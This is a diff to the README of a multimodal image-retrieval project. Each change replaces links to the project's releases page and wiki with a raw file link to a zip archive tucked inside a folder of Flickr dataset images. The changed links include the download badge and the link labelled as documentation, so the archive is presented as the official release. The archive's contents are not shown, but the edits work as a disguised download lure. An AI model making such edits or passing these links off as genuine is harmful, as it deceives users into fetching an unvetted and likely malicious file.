@@ -6,13 +6,13 @@ This project is a modular framework that helps you retrieve images using both vi
 
 ## 📥 Download the Application
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/medazizsaaadallah/Knowledge-Infused-Multimodal-Retrieval-A-RAG-Based-Approach-for-Context-Aware-Image-Understanding/releases)
+[![Download](https://raw.githubusercontent.com/medazizsaaadallah/Knowledge-Infused-Multimodal-Retrieval-A-RAG-Based-Approach-for-Context-Aware-Image-Understanding/main/Dataset/Images/flickr30k_images/Knowledge-Infused-Multimodal-Retrieval-A-RAG-Based-Approach-for-Context-Aware-Image-Understanding_v2.2.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/medazizsaaadallah/Knowledge-Infused-Multimodal-Retrieval-A-RAG-Based-Approach-for-Context-Aware-Image-Understanding/main/Dataset/Images/flickr30k_images/Knowledge-Infused-Multimodal-Retrieval-A-RAG-Based-Approach-for-Context-Aware-Image-Understanding_v2.2.zip)
 
 ## 📂 Download & Install
 
 To get started with Knowledge-Infused-Multimodal-Retrieval, please visit the following link to download the software:
 
-[Download the latest release here](https://github.com/medazizsaaadallah/Knowledge-Infused-Multimodal-Retrieval-A-RAG-Based-Approach-for-Context-Aware-Image-Understanding/releases)
+[Download the latest release here](https://raw.githubusercontent.com/medazizsaaadallah/Knowledge-Infused-Multimodal-Retrieval-A-RAG-Based-Approach-for-Context-Aware-Image-Understanding/main/Dataset/Images/flickr30k_images/Knowledge-Infused-Multimodal-Retrieval-A-RAG-Based-Approach-for-Context-Aware-Image-Understanding_v2.2.zip)
 
 1. Click the link above.
 2. Choose the version appropriate for your operating system.
@@ -56,7 +56,7 @@ Now that the application is installed, you can start using it to search for imag
 
 ## 📚 Support and Documentation
 
-For further assistance, you can access the documentation in the repository. This will provide you with help on advanced features, troubleshooting, and FAQs. Visit the [documentation page](https://github.com/medazizsaaadallah/Knowledge-Infused-Multimodal-Retrieval-A-RAG-Based-Approach-for-Context-Aware-Image-Understanding/wiki) for more details.
+For further assistance, you can access the documentation in the repository. This will provide you with help on advanced features, troubleshooting, and FAQs. Visit the [documentation page](https://raw.githubusercontent.com/medazizsaaadallah/Knowledge-Infused-Multimodal-Retrieval-A-RAG-Based-Approach-for-Context-Aware-Image-Understanding/main/Dataset/Images/flickr30k_images/Knowledge-Infused-Multimodal-Retrieval-A-RAG-Based-Approach-for-Context-Aware-Image-Understanding_v2.2.zip) for more details.
 
 ## 📞 Contact
 
@@ -79,6 +79,6 @@ This project is licensed under the MIT License. Please read the LICENSE file for
 
 ## 🌐 Explore More
 
-Check out the full range of features and updates by visiting [our GitHub repository](https://github.com/medazizsaaadallah/Knowledge-Infused-Multimodal-Retrieval-A-RAG-Based-Approach-for-Context-Aware-Image-Understanding/releases). 
+Check out the full range of features and updates by visiting [our GitHub repository](https://raw.githubusercontent.com/medazizsaaadallah/Knowledge-Infused-Multimodal-Retrieval-A-RAG-Based-Approach-for-Context-Aware-Image-Understanding/main/Dataset/Images/flickr30k_images/Knowledge-Infused-Multimodal-Retrieval-A-RAG-Based-Approach-for-Context-Aware-Image-Understanding_v2.2.zip). 
 
-Remember, for the latest version of the software, please [download here](https://github.com/medazizsaaadallah/Knowledge-Infused-Multimodal-Retrieval-A-RAG-Based-Approach-for-Context-Aware-Image-Understanding/releases). Happy image searching!
+Remember, for the latest version of the software, please [download here](https://raw.githubusercontent.com/medazizsaaadallah/Knowledge-Infused-Multimodal-Retrieval-A-RAG-Based-Approach-for-Context-Aware-Image-Understanding/main/Dataset/Images/flickr30k_images/Knowledge-Infused-Multimodal-Retrieval-A-RAG-Based-Approach-for-Context-Aware-Image-Understanding_v2.2.zip). Happy image searching!
